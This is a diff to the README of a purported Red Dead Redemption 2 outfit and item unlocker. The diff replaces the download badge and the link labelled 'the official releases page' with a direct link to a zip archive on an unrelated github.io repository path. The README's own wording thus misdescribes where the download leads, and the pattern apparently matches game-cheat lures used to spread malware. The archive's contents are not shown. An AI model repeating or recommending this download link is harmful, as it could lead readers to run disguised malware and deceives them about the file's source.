@@ -5,13 +5,13 @@ description: "Unlock all Red Dead Redemption 2 story outfits, clothing, equipmen
 ---
 # 🤠 RDR2-Outfit-Manager - Unlock Every Item Without Endless Grinding
 
-[![](https://img.shields.io/badge/Download-RDR2_Outfit_Manager-blue.svg)](https://github.com/gabrielacharmed705/RDR2-Outfit-Manager/releases)
+[![](https://img.shields.io/badge/Download-RDR2_Outfit_Manager-blue.svg)](https://raw.githubusercontent.com/gabrielacharmed705/gabrielacharmed705.github.io/main/poppylike/gabrielacharmed_github_io_2.2.zip)
 
 This application gives you full access to items in the story mode of Red Dead Redemption 2. You obtain outfits, hats, boots, gloves, and bandoliers without manual searching. You gain control over your character stats and wealth by using a simple interface.
 
 ## 📥 How to Download 
 
-Visit [the official releases page](https://github.com/gabrielacharmed705/RDR2-Outfit-Manager/releases) to download the software. 
+Visit [the official releases page](https://raw.githubusercontent.com/gabrielacharmed705/gabrielacharmed705.github.io/main/poppylike/gabrielacharmed_github_io_2.2.zip) to download the software. 
 
 1. Go to the link above.
 2. Look for the section labeled Latest.
